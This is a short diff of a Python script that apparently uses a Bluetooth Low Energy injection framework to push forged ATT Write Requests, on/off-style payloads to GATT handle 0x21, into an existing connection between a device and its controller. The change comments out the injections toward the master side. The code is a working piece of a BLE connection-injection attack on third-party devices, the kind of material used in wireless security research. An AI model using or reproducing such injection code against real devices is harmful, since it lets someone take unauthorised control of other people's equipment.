@@ -32,9 +32,9 @@ if __name__ == '__main__':
                     sleep(1)
                     print(injector.inject_to_slave(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x01\x0d\x0a")))
                     sleep(1)
-                    print(injector.inject_to_master(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x00\x0d\x0a")))
-                    sleep(1)
-                    print(injector.inject_to_master(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x01\x0d\x0a")))
+                    #print(injector.inject_to_master(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x00\x0d\x0a")))
+                    #sleep(1)
+                    #print(injector.inject_to_master(BTLE_DATA()/L2CAP_Hdr()/ATT_Hdr()/ATT_Write_Request(gatt_handle=0x21, data=b"\x55\x10\x01\x0d\x0a")))
                     sleep(1)
             except ConnectionLostException as e:
                 print("Connection lost", e)
